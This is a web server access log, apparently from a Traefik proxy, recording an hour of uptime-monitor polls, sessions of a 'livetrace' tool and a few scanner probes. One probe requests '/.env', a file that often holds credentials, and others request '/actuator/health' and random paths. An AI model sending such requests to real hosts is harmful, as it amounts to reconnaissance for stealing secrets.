159.203.109.206 - - [14/Dec/2023:15:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2628 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2629 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2630 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2631 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2632 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2633 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2634 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2635 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2636 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2637 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2638 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2639 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2640 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2641 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2642 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2643 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2644 "www@docker" "http://172.25.0.8:80" 1ms
89.187.178.158 - - [14/Dec/2023:16:03:28 +0000] "GET /trace/ HTTP/2.0" 200 768 "-" "-" 2645 "livetrace@docker" "http://172.25.0.5:80" 10ms
89.187.178.158 - - [14/Dec/2023:16:03:28 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 2646 "livetrace@docker" "http://172.25.0.5:80" 0ms
89.187.178.158 - - [14/Dec/2023:16:03:28 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 2647 "livetrace@docker" "http://172.25.0.5:80" 0ms
89.187.178.158 - - [14/Dec/2023:16:03:28 +0000] "GET /trace/start.php?id=9kyfkoewv HTTP/2.0" 200 104 "-" "-" 2648 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:16:03:29 +0000] "GET /trace/poll.php?id=9kyfkoewv HTTP/2.0" 200 233 "-" "-" 2649 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:16:03:30 +0000] "GET /trace/poll.php?id=9kyfkoewv HTTP/2.0" 200 307 "-" "-" 2650 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:16:03:31 +0000] "GET /trace/poll.php?id=9kyfkoewv HTTP/2.0" 200 381 "-" "-" 2651 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:16:03:32 +0000] "GET /trace/poll.php?id=9kyfkoewv HTTP/2.0" 200 455 "-" "-" 2652 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:16:03:33 +0000] "GET /trace/poll.php?id=9kyfkoewv HTTP/2.0" 200 529 "-" "-" 2653 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:16:03:34 +0000] "GET /trace/poll.php?id=9kyfkoewv HTTP/2.0" 200 603 "-" "-" 2654 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:16:03:35 +0000] "GET /trace/poll.php?id=9kyfkoewv HTTP/2.0" 200 677 "-" "-" 2655 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:16:03:36 +0000] "GET /trace/poll.php?id=9kyfkoewv HTTP/2.0" 200 751 "-" "-" 2656 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:16:03:37 +0000] "GET /trace/poll.php?id=9kyfkoewv HTTP/2.0" 200 1050 "-" "-" 2657 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2658 "www@docker" "http://172.25.0.8:80" 0ms
172.58.56.41 - - [14/Dec/2023:16:04:03 +0000] "GET /trace/ HTTP/2.0" 200 752 "-" "-" 2659 "livetrace@docker" "http://172.25.0.5:80" 5041ms
172.58.56.41 - - [14/Dec/2023:16:04:08 +0000] "GET /trace/start.php?id=t0gcgx1ux HTTP/2.0" 200 102 "-" "-" 2660 "livetrace@docker" "http://172.25.0.5:80" 3ms
172.58.56.41 - - [14/Dec/2023:16:04:09 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2661 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.56.41 - - [14/Dec/2023:16:04:10 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2662 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.56.41 - - [14/Dec/2023:16:04:11 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2663 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.56.41 - - [14/Dec/2023:16:04:12 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2664 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.56.41 - - [14/Dec/2023:16:04:13 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2665 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.56.41 - - [14/Dec/2023:16:04:14 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2666 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.56.41 - - [14/Dec/2023:16:04:15 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2667 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.56.41 - - [14/Dec/2023:16:04:16 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2668 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.56.41 - - [14/Dec/2023:16:04:17 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2669 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.56.41 - - [14/Dec/2023:16:04:18 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2670 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.56.41 - - [14/Dec/2023:16:04:19 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2671 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.56.41 - - [14/Dec/2023:16:04:20 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2672 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.56.41 - - [14/Dec/2023:16:04:21 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2673 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.56.41 - - [14/Dec/2023:16:04:22 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2674 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.56.41 - - [14/Dec/2023:16:04:23 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2675 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2676 "www@docker" "http://172.25.0.8:80" 0ms
172.58.56.41 - - [14/Dec/2023:16:04:24 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2677 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.56.41 - - [14/Dec/2023:16:04:25 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2678 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.58.56.41 - - [14/Dec/2023:16:04:26 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 81 "-" "-" 2679 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.58.56.41 - - [14/Dec/2023:16:04:27 +0000] "GET /trace/poll.php?id=t0gcgx1ux HTTP/2.0" 200 242 "-" "-" 2680 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2681 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2682 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2683 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2684 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2685 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2686 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2687 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2688 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2689 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2690 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2691 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2692 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2693 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2694 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2695 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2696 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2697 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2698 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2699 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2700 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2701 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:16:14:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2702 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:16:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2703 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2704 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2705 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2706 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2707 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2708 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2709 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2710 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2711 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2712 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2713 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2714 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2715 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2716 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2717 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2718 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2719 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2720 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:16:23:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2721 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:16:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2722 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2723 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2724 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2725 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2726 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2727 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2728 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2729 "www@docker" "http://172.25.0.8:80" 1ms
45.79.221.160 - - [14/Dec/2023:16:28:18 +0000] "GET /nbX4 HTTP/1.1" 404 19 "-" "-" 2730 "-" "-" 0ms
45.79.221.160 - - [14/Dec/2023:16:28:18 +0000] "GET /nMr0 HTTP/1.1" 404 19 "-" "-" 2731 "-" "-" 0ms
45.79.221.160 - - [14/Dec/2023:16:28:22 +0000] "GET /xBQQ HTTP/1.1" 301 17 "-" "-" 2732 "web-to-websecure@internal" "-" 0ms
45.79.221.160 - - [14/Dec/2023:16:28:22 +0000] "GET /aXp4 HTTP/1.1" 301 17 "-" "-" 2733 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:16:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2734 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2735 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2736 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2737 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2738 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2739 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2740 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2741 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2742 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2743 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2744 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2745 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2746 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2747 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2748 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2749 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2750 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2751 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2752 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2753 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2754 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2755 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2756 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2757 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2758 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2759 "www@docker" "http://172.25.0.8:80" 0ms
54.37.79.75 - - [14/Dec/2023:16:41:21 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2760 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [14/Dec/2023:16:41:21 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2761 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:16:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2762 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2763 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2764 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2765 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2766 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2767 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2768 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2769 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2770 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2771 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2772 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2773 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2774 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2775 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2776 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2777 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2778 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2779 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2780 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2781 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2782 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2783 "www@docker" "http://172.25.0.8:80" 1ms
162.243.137.14 - - [14/Dec/2023:16:51:39 +0000] "GET /actuator/health HTTP/1.1" 404 19 "-" "-" 2784 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:16:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2785 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2786 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2787 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2788 "www@docker" "http://172.25.0.8:80" 1ms
162.243.139.43 - - [14/Dec/2023:16:54:19 +0000] "GET /actuator/health HTTP/1.1" 404 19 "-" "-" 2789 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:16:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2790 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2791 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2792 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2793 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2794 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2795 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2796 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2797 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:16:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2798 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:16:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2799 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:16:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2800 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:16:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2801 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2802 "www@docker" "http://172.25.0.8:80" 0ms
